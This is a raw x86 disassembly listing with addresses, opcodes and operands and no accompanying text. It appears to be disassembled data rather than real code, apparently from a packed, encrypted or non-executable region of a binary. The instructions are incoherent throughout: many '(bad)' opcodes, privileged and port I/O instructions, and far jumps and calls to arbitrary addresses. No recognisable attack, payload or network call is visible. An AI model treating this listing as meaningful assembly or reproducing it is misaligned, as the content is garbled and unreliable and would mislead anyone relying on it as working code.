  4273cb:	and    DWORD PTR ds:0x87e8536c,edx
  4273d1:	les    ecx,FWORD PTR [eax-0x2ee825c4]
  4273d7:	cmp    esi,DWORD PTR [edx+edi*4]
  4273da:	xor    BYTE PTR [ecx+0x36855574],bh
  4273e0:	hlt    
  4273e1:	xlat   BYTE PTR ds:[ebx]
  4273e2:	sahf   
  4273e3:	dec    esi
  4273e4:	jl     0x42738c
  4273e6:	ja     0x4273e1
  4273e8:	jne    0x42744c
  4273ea:	sbb    al,0xdb
  4273ec:	inc    ebp
  4273ed:	inc    esp
  4273ee:	add    al,0x14
  4273f0:	ins    DWORD PTR es:[edi],dx
  4273f1:	pop    esp
  4273f2:	out    dx,al
  4273f3:	sar    BYTE PTR [ebp+ecx*2+0xe],cl
  4273f7:	pop    es
  4273f8:	gs mov ch,0xa6
  4273fb:	and    al,0x7c
  4273fd:	xor    bl,BYTE PTR [ebp+0x28]
  427400:	ret    0x6404
  427403:	mov    eax,ds:0x452a4c5a
  427408:	mov    ebx,0x6b3d4b8d
  42740d:	jb     0x427458
  42740f:	inc    edi
  427410:	hlt    
  427411:	sbb    ebx,DWORD PTR [ebx]
  427413:	dec    eax
  427414:	dec    esp
  427415:	pop    edi
  427416:	inc    esi
  427417:	add    al,0x2
  427419:	js     0x4273a6
  42741b:	fmul   QWORD PTR [esi+0x30baabff]
  427421:	mov    DWORD PTR [eax-0x68ca8023],edx
  427427:	xor    al,0xa8
  427429:	pop    edi
  42742a:	ret    0x249b
  42742d:	inc    BYTE PTR [eax]
  42742f:	ror    esi,0xf
  427432:	ror    BYTE PTR [edi],cl
  427434:	rcr    ebp,cl
  427436:	fistp  WORD PTR [edi+0x289a13f0]
  42743c:	dec    ecx
  42743d:	fild   WORD PTR [ecx+0x78]
  427440:	jmp    0x427443
  427442:	add    bh,ah
  427444:	add    DWORD PTR [eax],eax
  427446:	add    BYTE PTR [eax+esi*4+0x75d27fe9],bl
  42744d:	add    edi,ebx
  42744f:	cwde   
  427450:	push   ebp
  427451:	pusha  
  427452:	fisttp WORD PTR [ebx]
  427454:	mov    eax,0xaf2af736
  427459:	pop    ebp
  42745a:	icebp  
  42745b:	pop    edx
  42745c:	jns    0x42745f
  42745e:	mov    eax,fs
  427460:	xor    al,0x99
  427462:	out    dx,eax
  427463:	cmc    
  427464:	mov    edx,edx
  427466:	xor    BYTE PTR [ebp+0x3b4724fd],dh
  42746c:	lods   al,BYTE PTR ds:[esi]
  42746d:	idiv   BYTE PTR [edi]
  42746f:	dec    ebp
  427470:	or     DWORD PTR [esp+esi*1+0x75],ebp
  427474:	int    0x7f
  427476:	jecxz  0x427462
  427478:	call   0x6560:0xb0b47473
  42747f:	into   
  427480:	scas   eax,DWORD PTR es:[edi]
  427481:	ret    0x8c61
  427484:	adc    eax,0x699fe434
  427489:	loopne 0x4274d5
  42748b:	xchg   edi,eax
  42748c:	add    eax,0xdcda83cb
  427491:	pop    esi
  427492:	ss scas eax,DWORD PTR es:[edi]
  427494:	xor    ah,BYTE PTR [ecx]
  427496:	or     al,0x6f
  427498:	mov    eax,0xf108380d
  42749d:	and    esi,esp
  42749f:	adc    DWORD PTR [ebx],edx
  4274a1:	inc    edx
  4274a2:	push   ebp
  4274a3:	imul   ebp,DWORD PTR [eax+esi*2+0x62],0x74
  4274a8:	add    bl,BYTE PTR [ecx]
  4274aa:	xlat   BYTE PTR ds:[ebx]
  4274ab:	call   0xafe:0x2a9300dc
  4274b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274b3:	rcr    DWORD PTR [ebp+0x68],0x2e
  4274b7:	aaa    
  4274b8:	inc    ecx
  4274b9:	sub    eax,0xd0948998
  4274be:	mov    edi,0x94fc749d
  4274c3:	or     DWORD PTR [esi],ecx
  4274c5:	xor    DWORD PTR [edx],edi
  4274c7:	pop    es
  4274c8:	xchg   edi,eax
  4274c9:	pop    ds
  4274ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274cb:	and    edi,esp
  4274cd:	inc    ebp
  4274ce:	jmp    0x7d75:0x97a8940d
  4274d5:	or     DWORD PTR [ebx],edx
  4274d7:	cld    
  4274d8:	sub    cl,ch
  4274da:	mov    BYTE PTR [ebp-0x57],dl
  4274dd:	imul   esp,DWORD PTR [ecx+0xc],0xffffffea
  4274e1:	mov    ah,0x59
  4274e3:	dec    ecx
  4274e4:	push   0xfe3d2c48
  4274e9:	pop    esp
  4274ea:	nop
  4274eb:	pushf  
  4274ec:	push   ds
  4274ed:	sub    edx,DWORD PTR [ecx+0x112a0370]
  4274f3:	dec    eax
  4274f4:	sub    BYTE PTR [edi],0x77
  4274f7:	loop   0x427488
  4274f9:	clc    
  4274fa:	add    BYTE PTR [eax-0x246e1f88],al
  427500:	sbb    ecx,edi
  427502:	cmc    
  427503:	nop
  427504:	or     al,0xe3
  427506:	mov    eax,0x1576fdb4
  42750b:	adc    BYTE PTR [esi+0x78],dl
  42750e:	test   al,0x9d
  427510:	push   edi
  427511:	and    DWORD PTR [edx-0x76d451d4],ecx
  427517:	(bad)  
  427519:	inc    eax
  42751a:	fwait
  42751b:	cmp    bh,al
  42751d:	fs or  ebx,edx
  427520:	cmp    al,0xc5
  427522:	(bad)  
  427523:	fcom   DWORD PTR [edi+0x75]
  427526:	call   0x1d3c2c4e
  42752b:	mov    edi,0x184a2955
  427530:	push   ebx
  427531:	dec    ebp
  427532:	and    al,0x46
  427534:	jp     0x42758b
  427536:	pop    edx
  427537:	jmp    0x377d97d1
  42753c:	scas   al,BYTE PTR es:[edi]
  42753d:	pop    edx
  42753e:	cwde   
  42753f:	fdivr  QWORD PTR [edx+0x1f38d374]
  427545:	outs   dx,DWORD PTR ds:[esi]
  427546:	mov    WORD PTR [eax+ebx*2+0x3c35fee2],gs
  42754d:	js     0x4275bc
  42754f:	xchg   ebx,eax
  427550:	add    ecx,ebp
  427552:	xchg   DWORD PTR [esi-0x65],edx
  427555:	add    ch,BYTE PTR [esi+ebp*4+0x6e]
  427559:	mov    eax,0x7d9739b3
  42755e:	shl    BYTE PTR [edx],0x29
  427561:	loope  0x427536
  427563:	cmc    
  427564:	mov    eax,ds:0xc0bb4c34
  427569:	push   eax
  42756a:	and    esp,ebx
  42756c:	push   esp
  42756d:	ret    
  42756e:	inc    ebx
  42756f:	call   0x1be22a7e
  427574:	out    dx,al
  427575:	pop    es
  427576:	je     0x4274fe
  427578:	sub    al,0x99
  42757a:	pop    ss
  42757b:	or     eax,esi
  42757d:	xchg   esi,eax
  42757e:	test   bl,0xeb
  427581:	je     0x427559
  427583:	(bad)  
  427585:	popa   
  427586:	icebp  
  427587:	xlat   BYTE PTR gs:[ebx]
  427589:	push   0xa46f2582
  42758e:	jb     0x427529
  427590:	loopne 0x42753f
  427592:	inc    ebx
  427593:	mov    WORD PTR [ebx-0xdec7399],ds
  427599:	xchg   esi,eax
  42759a:	xor    al,0x9a
  42759c:	hlt    
  42759d:	and    ebx,DWORD PTR [ebx-0x72]
  4275a0:	jl     0x4275d3
  4275a2:	test   eax,0xf5fbf953
  4275a7:	cli    
  4275a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275a9:	fcmovu st,st(6)
  4275ab:	dec    ecx
  4275ac:	mov    dl,0x1d
  4275ae:	inc    ecx
  4275af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275b0:	js     0x427558
  4275b2:	ss repnz mov eax,0xdb82d9a4
  4275b9:	xchg   esi,eax
  4275ba:	mov    ch,BYTE PTR [edi+ecx*4-0x66]
  4275be:	mov    edi,ss
  4275c0:	call   0x518:0x30c4f7b2
  4275c7:	rcl    DWORD PTR [ebp-0x4104860a],0xd
  4275ce:	dec    ecx
  4275cf:	mov    esp,0x296e3588
  4275d4:	push   eax
  4275d5:	push   ebp
  4275d6:	jb     0x427558
  4275d8:	xor    al,0x30
  4275da:	out    0x47,eax
  4275dc:	int    0x88
  4275de:	push   DWORD PTR [edx+edi*8-0x206d404d]
  4275e5:	rcl    DWORD PTR [ebx],1
  4275e7:	push   ebp
  4275e8:	dec    esp
  4275e9:	out    0x3f,al
  4275eb:	int    0x4f
  4275ed:	rol    BYTE PTR [edx],0xef
  4275f0:	push   esi
  4275f1:	aad    0x7a
  4275f3:	call   0x7ba4:0x6f4de6da
  4275fa:	cmp    eax,0x8fc38ca7
  4275ff:	ja     0x4275ca
  427601:	jbe    0x427628
  427603:	clc    
  427604:	nop
  427605:	pop    ds
  427606:	adc    cl,BYTE PTR [eax+0x7f]
  427609:	or     bl,BYTE PTR [edi+0x5f]
  42760c:	test   al,0x9c
  42760e:	cmc    
  42760f:	xor    ch,bh
  427611:	mov    ebx,0x220b7970
  427616:	nop
  427617:	call   0x11abe8e3
  42761c:	jl     0x42761c
  42761e:	push   ebx
  42761f:	dec    ecx
  427620:	cwde   
  427621:	xchg   eax,edx
  427623:	sbb    BYTE PTR [ecx-0x3ac16bc0],bl
  427629:	inc    ecx
  42762a:	adc    ebp,DWORD PTR [ebp-0x19]
  42762d:	mov    ds:0x60f0f000,eax
  427632:	pushf  
  427633:	pusha  
  427634:	pushf  
  427635:	cld    
  427636:	cld    
  427637:	mov    cl,0xdf
  427639:	aaa    
  42763a:	or     DWORD PTR [ebp-0x47],esp
  42763d:	retf   0x5fb0
  427640:	in     eax,dx
  427641:	add    DWORD PTR [eax],eax
  427643:	out    0x1,eax
  427645:	add    BYTE PTR [eax],al
  427647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427648:	xchg   edi,eax
  427649:	pop    edx
  42764a:	or     eax,0x939b372a
  42764f:	jmp    0x99ab:0x313f7abe
  427656:	pop    ecx
  427657:	enter  0x893c,0x39
  42765b:	mov    edx,0xb6fa48de
  427660:	dec    ebp
  427661:	icebp  
  427662:	cld    
  427663:	test   BYTE PTR [eax+edi*4+0x25],0x80
  427668:	in     eax,dx
  427669:	mov    ebx,DWORD PTR [esi]
  42766b:	(bad)  
  42766d:	ins    BYTE PTR es:[edi],dx
  42766e:	or     al,0x9a
  427670:	push   cs
  427671:	mov    al,ds:0x6dfa51d5
  427676:	mov    ecx,0x7397f360
  42767b:	cmp    dh,cl
  42767d:	aad    0xe
  42767f:	lods   eax,DWORD PTR ds:[esi]
  427680:	jl     0x427631
  427682:	xchg   edx,eax
  427683:	les    ebx,FWORD PTR [eax+0x5a2e0e5d]
  427689:	lods   eax,DWORD PTR ds:[esi]
  42768a:	mul    dh
  42768c:	mov    ecx,0x2d3dd5f0
  427691:	xchg   ebx,eax
  427692:	cmp    BYTE PTR [eax-0x2a],bl
  427695:	and    BYTE PTR [edx-0x22],ah
  427698:	retf   
  427699:	jnp    0x427666
  42769b:	out    0x31,al
  42769d:	mov    BYTE PTR [eax+0x2fee2a1a],bl
  4276a3:	out    0x4,al
  4276a5:	mov    ds:0xd3c3beeb,eax
  4276aa:	jmp    0x547ab2a0
  4276af:	mov    al,0x63
  4276b1:	mov    bh,0x6b
  4276b3:	inc    ebp
  4276b4:	fcmovnu st,st(6)
  4276b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276b7:	fwait
  4276b8:	xchg   al,ch
  4276ba:	lahf   
  4276bb:	iret   
  4276bc:	and    edi,DWORD PTR [ebx]
  4276be:	aaa    
  4276bf:	inc    BYTE PTR [edx+0x69]
  4276c2:	aas    
  4276c3:	int3   
  4276c4:	jmp    0x3f2a:0x43f41790
  4276cb:	jno    0x427697
  4276cd:	in     al,0xf3
  4276cf:	lea    edi,[ebx+esi*1+0xb]
  4276d3:	or     BYTE PTR [edi],0xf2
  4276d6:	cld    
  4276d7:	or     edi,DWORD PTR [ebp+0x4a]
  4276da:	or     al,0x76
  4276dc:	ja     0x427742
  4276de:	dec    ecx
  4276df:	rcr    ecx,cl
  4276e1:	ins    BYTE PTR es:[edi],dx
  4276e2:	(bad)  
  4276e3:	in     eax,dx
  4276e4:	es pop ss
  4276e6:	xchg   esp,eax
  4276e7:	push   esp
  4276e8:	cmp    DWORD PTR [edi],edx
  4276ea:	xor    DWORD PTR [edx-0x301d49c4],0x13
  4276f1:	or     ch,BYTE PTR [edi+0x59]
  4276f4:	or     BYTE PTR [esi],cl
  4276f6:	mov    esi,0x425fc58a
  4276fb:	push   ebp
  4276fc:	fbld   TBYTE PTR [ecx]
  4276fe:	jae    0x427690
  427700:	push   edx
  427701:	ret    
  427702:	cmp    edi,esi
  427704:	sub    DWORD PTR [eax],ecx
  427706:	jno    0x427693
  427708:	imul   edi,DWORD PTR [edi-0x62427a4f],0x49
  42770f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427710:	retf   
  427711:	push   ebx
  427712:	jbe    0x427787
  427714:	adc    DWORD PTR [edx+0x2b91c4fc],esp
  42771a:	pop    ecx
  42771b:	shl    BYTE PTR [ecx+0x75c8df3e],cl
  427721:	ds pop ebp
  427723:	in     al,0xaf
  427725:	push   ds
  427726:	push   ss
  427727:	dec    ebx
  427728:	sub    DWORD PTR [ebp-0x2a4666fc],ebx
  42772e:	add    DWORD PTR [ebx-0x20],edx
  427731:	push   ebx
  427732:	gs push esp
  427734:	retf   0x3f8b
  427737:	(bad)  
  427738:	sub    al,0xd5
  42773a:	stc    
  42773b:	push   0x3c
  42773d:	aaa    
  42773e:	add    ah,al
  427740:	mov    ebx,DWORD PTR [esp+eiz*8-0x1c]
  427744:	cs push 0x5859b883
  42774a:	test   eax,0x44a86860
  42774f:	and    dh,bl
  427751:	or     eax,0x66ee5bd8
  427756:	or     eax,0xa66b49cf
  42775b:	push   ds
  42775c:	xchg   BYTE PTR [ecx-0x47],al
  42775f:	jae    0x4276fe
  427761:	mov    ds:0x78101802,eax
  427766:	fdivr  DWORD PTR [ebx-0x635c859a]
  42776c:	push   edi
  42776d:	jmp    0x4277ea
  42776f:	ficomp DWORD PTR [edx]
  427771:	or     al,0x65
  427773:	lahf   
  427774:	jns    0x427782
  427776:	add    al,BYTE PTR [esp+edx*1-0x54918da7]
  42777d:	fstp   DWORD PTR [edi+0x4e]
  427780:	sti    
  427781:	std    
  427782:	shl    DWORD PTR [esi-0x1246f876],0x30
  427789:	mov    ebx,0x93134694
  42778e:	iret   
  42778f:	(bad)  
  427790:	lods   al,BYTE PTR ds:[esi]
  427791:	xlat   BYTE PTR ds:[ebx]
  427792:	inc    ebx
  427793:	(bad)  
  427795:	dec    ecx
  427796:	cmp    dh,BYTE PTR [edx-0x6d6320f8]
  42779c:	and    BYTE PTR [edx-0x11],cl
  42779f:	pop    es
  4277a0:	int3   
  4277a1:	push   ecx
  4277a2:	dec    esi
  4277a3:	cli    
  4277a4:	add    al,0xae
  4277a6:	jo     0x427773
  4277a8:	xchg   ebp,eax
  4277a9:	pop    ds
  4277aa:	test   edx,0xd2c33a85
  4277b0:	mov    eax,0x23383ffd
  4277b5:	stos   DWORD PTR es:[edi],eax
  4277b6:	je     0x427772
  4277b8:	push   ebx
  4277b9:	fstp   DWORD PTR [edx-0x6c]
  4277bc:	clc    
  4277bd:	into   
  4277be:	xadd   DWORD PTR [esp+edi*4-0x13],ecx
  4277c3:	cli    
  4277c4:	fstp   st(0)
  4277c6:	ss jo  0x427789
  4277c9:	nop
  4277ca:	pop    ebx
  4277cb:	cmp    eax,esi
  4277cd:	sub    BYTE PTR [esi+0x24],dl
  4277d0:	add    edi,ebx
  4277d2:	aas    
  4277d3:	dec    ecx
  4277d4:	mov    ebx,0x5d7afd63
  4277d9:	lock and esp,DWORD PTR ds:0x8d60dc03
  4277e0:	sub    BYTE PTR [ecx],0x5e
  4277e3:	cmp    BYTE PTR [edx-0x19359369],al
  4277e9:	push   0x8793dc0c
  4277ee:	lds    ecx,FWORD PTR [ecx]
  4277f0:	call   0x3bb9:0xbcbcf139
  4277f7:	mov    al,ds:0xaa0518c7
  4277fc:	sbb    ebp,eax
  4277fe:	imul   edx,DWORD PTR [esi+0x41c3c15a],0x666601d
  427808:	pop    edi
  427809:	jne    0x427846
  42780b:	idiv   DWORD PTR [edi+0x7b]
  42780e:	inc    edx
  42780f:	jno    0x4277b6
  427811:	pop    ebp
  427812:	push   eax
  427813:	jo     0x42786c
  427815:	mov    edx,0xe9669d18
  42781a:	iret   
  42781b:	dec    esp
  42781c:	dec    ebx
  42781d:	cmp    al,0xbc
  42781f:	jns    0x4277a6
  427821:	cdq    
  427822:	sub    edx,esp
  427824:	je     0x427836
  427826:	cld    
  427827:	xor    eax,0xea5aae54
  42782c:	xlat   BYTE PTR ds:[ebx]
  42782d:	add    al,BYTE PTR [eax]
  42782f:	sbb    eax,DWORD PTR [ebp+0x65]
  427832:	ret    
  427833:	jg     0x427818
  427835:	mov    edi,0xbc0396dd
  42783a:	sbb    ecx,ecx
  42783c:	cmc    
  42783d:	xchg   edx,eax
  42783e:	repz inc esi
  427840:	out    dx,eax
  427841:	add    DWORD PTR [eax],eax
  427843:	out    0x1,eax
  427845:	add    BYTE PTR [eax],al
  427847:	pop    es
  427848:	call   0xdfc4:0xac373dd5
  42784f:	stos   BYTE PTR es:[edi],al
  427850:	test   eax,0x9e9adfb9
  427855:	je     0x4277f7
  427857:	or     DWORD PTR [ebp+edx*1+0x3cf505e7],esp
  42785e:	nop
  42785f:	test   DWORD PTR [edx],esp
  427861:	push   esp
  427862:	xchg   edx,eax
  427863:	not    DWORD PTR [ebx-0x4]
  427866:	push   ebx
  427867:	mov    WORD PTR [edi+0x7ea61c2b],cs
  42786d:	dec    esp
  42786e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42786f:	xchg   ecx,eax
  427870:	push   esp
  427871:	add    eax,0xb5058d36
  427876:	push   ebx
  427877:	xchg   edx,eax
  427879:	add    eax,0x52468e3d
  42787e:	adc    bh,dh
  427880:	and    al,ah
  427882:	and    esp,DWORD PTR [esp+ebx*2]
  427885:	repz smsw WORD PTR [esi+0x3d]
  42788a:	into   
  42788b:	mov    ds,edx
  42788d:	pop    ds
  42788e:	cmp    DWORD PTR [ecx-0x111d8c2f],eax
  427894:	mov    ecx,0x1a51115f
  427899:	popa   
  42789a:	out    dx,al
  42789b:	adc    ch,bl
  42789d:	xor    edi,edx
  42789f:	mov    cl,0x8b
  4278a1:	push   0xffffffc7
  4278a3:	fs lock popf 
  4278a6:	cs ffreep st(1)
  4278a9:	je     0x427927
  4278ab:	(bad)  [edi+0x71]
  4278ae:	std    
  4278af:	jecxz  0x42784d
  4278b1:	fistp  DWORD PTR ds:0x8b19871
  4278b7:	in     al,dx
  4278b8:	jno    0x4278ba
  4278ba:	(bad)  
  4278bb:	jle    0x427890
  4278bd:	push   eax
  4278be:	in     al,0x7f
  4278c0:	jg     0x4278c9
  4278c2:	call   0x870a:0xc91eb11b
  4278c9:	loopne 0x427875
  4278cb:	mov    esi,ecx
  4278cd:	push   es
  4278ce:	mov    bh,0xd6
  4278d0:	or     al,BYTE PTR [eax+0xf]
  4278d3:	cmp    dh,BYTE PTR [edi+0xa12a438]
  4278d9:	pusha  
  4278da:	fsubr  DWORD PTR [ecx+0x4a357f28]
  4278e0:	jns    0x4278d2
  4278e2:	sbb    edi,DWORD PTR [edx-0x2d]
  4278e5:	sbb    al,0x54
  4278e7:	stc    
  4278e8:	rol    DWORD PTR [ebx+0x64d476e5],0xd8
  4278ef:	mov    esi,0x907fab60
  4278f4:	adc    eax,0xf05d7ae1
  4278f9:	push   ss
  4278fa:	call   0xff0d5bbf
  4278ff:	idiv   ah
  427901:	xor    bh,BYTE PTR [ecx-0x54]
  427904:	ret    0x934
  427907:	std    
  427908:	sbb    ebp,DWORD PTR [ebp+edi*2+0x20]
  42790c:	inc    eax
  42790d:	cli    
  42790e:	rcl    DWORD PTR [ebp+0x3e],1
  427911:	and    eax,0x69baecc2
  427916:	mov    ah,0x68
  427918:	ret    0x9511
  42791b:	xlat   BYTE PTR ds:[ebx]
  42791c:	xchg   BYTE PTR [ebx-0x7577983a],cl
  427922:	adc    BYTE PTR [ecx],dl
  427924:	cmc    
  427925:	dec    esp
  427926:	test   BYTE PTR [ecx+esi*8-0x73],dl
  42792a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42792b:	out    0x99,eax
  42792d:	aaa    
  42792e:	data16 and BYTE PTR [edi+0x74],cl
  427932:	stos   DWORD PTR es:[edi],eax
  427933:	mov    WORD PTR [ebx],es
  427935:	scas   al,BYTE PTR es:[edi]
  427936:	(bad)  
  427937:	push   esp
  427938:	lahf   
  427939:	cdq    
  42793a:	mov    dh,0x81
  42793c:	daa    
  42793d:	call   edi
  42793f:	and    DWORD PTR [esi],ebx
  427941:	xor    bl,BYTE PTR [ebx+0x63]
  427944:	sub    dh,BYTE PTR [ebx]
  427946:	cmp    BYTE PTR [ecx],dl
  427948:	out    0x75,al
  42794a:	cmp    al,BYTE PTR [eax-0x19221b2b]
  427950:	loopne 0x42792a
  427952:	sti    
  427953:	or     BYTE PTR ds:0xa1e3996c,bh
  427959:	mov    ebp,0xc1b22662
  42795e:	jmp    0x89ff51e9
  427963:	pop    ebp
  427964:	clc    
  427965:	jmp    0x427948
  427967:	into   
  427968:	mov    ebx,0x95902529
  42796d:	lds    edx,FWORD PTR [edi-0x80]
  427970:	popf   
  427971:	or     ah,bh
  427973:	cdq    
  427974:	rcr    BYTE PTR [ebp+0x78],0x79
  427978:	push   edi
  427979:	les    eax,FWORD PTR [ebx]
  42797b:	dec    edi
  42797c:	mov    eax,0x26b181d1
  427981:	or     DWORD PTR [ebx-0x78],ecx
  427984:	ret    
  427985:	cmovo  ecx,DWORD PTR [ebp-0x61637b70]
  42798c:	fld    QWORD PTR [ecx]
  42798e:	sub    ecx,DWORD PTR [eax-0x2]
  427991:	push   0xf2a94af3
  427996:	mov    ds:0xb9c3fc1d,eax
  42799b:	in     al,0xf9
  42799d:	cwde   
  42799e:	xor    esi,DWORD PTR [edx]
  4279a0:	aad    0xf0
  4279a2:	lahf   
  4279a3:	jg     0x4279c4
  4279a5:	jae    0x4279d7
  4279a7:	inc    ebx
  4279a8:	pop    es
  4279a9:	mov    ds:0x72278800,al
  4279ae:	not    BYTE PTR [edx]
  4279b0:	xchg   BYTE PTR [edi+0x18],ah
  4279b3:	add    ah,BYTE PTR [eax-0x2a]
  4279b6:	adc    eax,0x5d4588be
  4279bb:	push   esi
  4279bc:	pusha  
  4279bd:	imul   ecx,DWORD PTR [ebx],0xffffffb5
  4279c0:	iret   
  4279c1:	mov    dl,0x28
  4279c3:	scas   al,BYTE PTR es:[edi]
  4279c4:	dec    edi
  4279c5:	add    BYTE PTR [ebx+0x2d4fc499],ch
  4279cb:	xor    BYTE PTR [ebx-0x6d],dl
  4279ce:	adc    al,0xb4
  4279d0:	xchg   edi,eax
  4279d1:	fisub  DWORD PTR [eax+ebp*8]
  4279d4:	jp     0x427998
  4279d6:	mov    BYTE PTR [ebx],dl
  4279d8:	inc    eax
  4279d9:	mov    eax,0xfceec1a1
  4279de:	mov    eax,0x707324ea
  4279e3:	pop    es
  4279e4:	add    BYTE PTR [ecx],dl
  4279e6:	jns    0x4279d1
  4279e8:	data16 ror BYTE PTR [ebx+edi*8+0x4a],0xb
  4279ee:	(bad)  
  4279ef:	xchg   ebp,eax
  4279f0:	scas   eax,DWORD PTR es:[edi]
  4279f1:	xor    al,cl
  4279f3:	mov    ds:0x6b7cd1f8,eax
  4279f8:	pop    es
  4279f9:	fidiv  DWORD PTR [esi-0x37]
  4279fc:	adc    al,0x46
  4279fe:	add    al,0x9a
  427a00:	inc    esi
  427a01:	jg     0x4279dd
  427a03:	mov    ebp,0xc0431fc2
  427a08:	js     0x4279e6
  427a0a:	lods   al,BYTE PTR ds:[esi]
  427a0b:	pop    edx
  427a0c:	cmp    al,0x40
  427a0e:	jmp    0xe3b68520
  427a13:	sbb    dh,bh
  427a15:	(bad)  
  427a16:	stc    
  427a17:	and    dh,BYTE PTR [esi+0x233c53ce]
  427a1d:	loop   0x4279ec
  427a1f:	sbb    al,0xeb
  427a21:	push   esi
  427a22:	jge    0x427a5e
  427a24:	sbb    al,0x64
  427a26:	call   0x6564:0x585e55b6
  427a2d:	test   al,0x0
  427a2f:	or     al,0x47
  427a31:	inc    ebx
  427a32:	xchg   esp,eax
  427a33:	dec    ebx
  427a34:	xchg   esp,eax
  427a35:	(bad)  
  427a37:	dec    eax
  427a38:	into   
  427a39:	adc    bl,BYTE PTR [ebp-0x114354fc]
  427a3f:	sub    eax,0xe70001f1
  427a44:	add    DWORD PTR [eax],eax
  427a46:	add    BYTE PTR [eax],ch
  427a48:	push   edx
  427a49:	mov    ch,0x4a
  427a4b:	dec    ebp
  427a4c:	sub    eax,0xb4c9eafe
  427a51:	ins    BYTE PTR es:[edi],dx
  427a52:	pusha  
  427a53:	out    dx,eax
  427a54:	(bad)
  427a57:	sub    ecx,DWORD PTR [edi]
  427a59:	repz sbb bh,BYTE PTR [esi+0x6cd271d8]
  427a60:	sahf   
  427a61:	ficom  WORD PTR [ebx]
  427a63:	add    BYTE PTR [edx],0xf2
  427a66:	fsub   QWORD PTR [eax-0x720dea24]
  427a6c:	fmul   DWORD PTR [edx-0x6b66e9ac]
  427a72:	pop    DWORD PTR [esi]
  427a74:	cmp    ch,al
  427a76:	pop    edx
  427a77:	fadd   QWORD PTR [edx-0x9]
  427a7a:	shl    DWORD PTR [eax],0x1f
  427a7d:	fwait
  427a7e:	inc    ebx
  427a7f:	out    0xa9,eax
  427a81:	jns    0x427a65
  427a83:	ror    al,1
  427a85:	jg     0x427a70
  427a87:	jnp    0x427aa3
  427a89:	into   
  427a8a:	cmp    eax,0x7a020608
  427a8f:	test   cl,ch
  427a91:	push   eax
  427a92:	rol    BYTE PTR [esi+ecx*4+0x26],0xcf
  427a97:	jmp    0xa72f:0x43fa8aa1
  427a9e:	scas   al,BYTE PTR es:[edi]
  427a9f:	push   ebp
  427aa0:	test   al,0x4f
  427aa2:	jne    0x427a3c
  427aa4:	adc    eax,0x16071082
  427aa9:	loop   0x427aef
  427aab:	fimul  WORD PTR [eax-0x77]
  427aae:	push   edi
  427aaf:	or     eax,0xf810adf0
  427ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ab5:	sbb    eax,0x50689ec0
  427aba:	add    DWORD PTR [edi+0x5c37dee9],ebp
  427ac0:	push   ss
  427ac1:	int    0x49
  427ac3:	sbb    eax,0x973618d0
  427ac8:	jbe    0x427af2
  427aca:	test   DWORD PTR [ecx-0x3e],0xf8293c67
  427ad1:	cdq    
  427ad2:	xchg   ebp,eax
  427ad3:	test   BYTE PTR [ecx],dl
  427ad5:	mov    edx,0x4cce0bb8
  427ada:	hlt    
  427adb:	or     eax,0xbbd379eb
  427ae0:	aad    0x8a
  427ae2:	add    eax,0xe41e19f5
  427ae7:	data16 jae 0x427afc
  427aea:	mov    ebx,0xe95e0ff
  427aef:	xchg   edi,eax
  427af0:	(bad)  
  427af1:	jnp    0x427a76
  427af3:	rol    DWORD PTR ds:0xdd9b7b21,1
  427af9:	in     al,0x48
  427afb:	into   
  427afc:	push   ebp
  427afd:	rol    DWORD PTR [ebx+0x5e],1
  427b00:	add    BYTE PTR [ecx-0x4f],cl
  427b03:	xlat   BYTE PTR ds:[ebx]
  427b04:	or     esp,edi
  427b06:	ds test al,ah
  427b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b0a:	and    cl,BYTE PTR [ebp+0x38fdae74]
  427b10:	ss inc ebx
  427b12:	out    0xd,al
  427b14:	dec    edx
  427b15:	imul   ebp,DWORD PTR [edx],0xffffffc9
  427b18:	xor    BYTE PTR [ecx+0xd516a4d],ah
  427b1e:	or     esi,DWORD PTR [esi+0x9]
  427b21:	outs   dx,DWORD PTR ds:[esi]
  427b22:	sbb    edi,DWORD PTR [ecx-0x37]
  427b25:	mov    eax,gs:0xb162359a
  427b2b:	inc    ecx
  427b2c:	sub    dh,bl
  427b2e:	ja     0x427b82
  427b30:	aas    
  427b31:	scas   eax,DWORD PTR es:[edi]
  427b32:	mov    cl,bh
  427b34:	mov    edi,0xc4f8165a
  427b39:	mov    ebp,0xe50e2375
  427b3e:	mov    al,BYTE PTR [ebx]
  427b40:	std    
  427b41:	pop    ebx
  427b42:	ret    0x1399
  427b45:	fisttp DWORD PTR [eax+esi*8]
  427b48:	push   0xffffffe0
  427b4a:	ins    BYTE PTR es:[edi],dx
  427b4b:	dec    esp
  427b4c:	jae    0x427b68
  427b4e:	es popa 
  427b50:	rcr    bl,0x2c
  427b53:	inc    ebp
  427b54:	fcom   st(0)
  427b56:	xchg   edi,eax
  427b57:	les    ebx,FWORD PTR [eax+0x5d]
  427b5a:	loope  0x427bdb
  427b5c:	cmp    DWORD PTR [ebp+0x4bf2608b],ebp
  427b62:	js     0x427b59
  427b64:	int    0x94
  427b66:	int    0xa3
  427b68:	in     al,dx
  427b69:	ror    bl,1
  427b6b:	adc    bh,ch
  427b6d:	xor    esp,DWORD PTR ds:0xf645d2ee
  427b73:	mov    BYTE PTR [eax],bh
  427b75:	xchg   ecx,edi
  427b77:	fadd   DWORD PTR [ebx]
  427b79:	jne    0x427b0e
  427b7b:	add    al,BYTE PTR [eax-0x67]
  427b7e:	push   edi
  427b7f:	mov    eax,0x5faf2d
  427b84:	cmp    eax,0x8578fe34
  427b89:	mov    DWORD PTR [ebx-0x6566d4d6],edx
  427b8f:	dec    ebp
  427b90:	rcr    BYTE PTR [edi-0x548c8e77],1
  427b96:	sbb    bl,BYTE PTR [esi+0x36c96966]
  427b9c:	sub    al,0x5e
  427b9e:	mov    edi,0x33e6f4fd
  427ba3:	nop
  427ba4:	shl    BYTE PTR [esi+0x2aca7d12],cl
  427baa:	aas    
  427bab:	lods   eax,DWORD PTR ds:[esi]
  427bac:	mov    ebp,edi
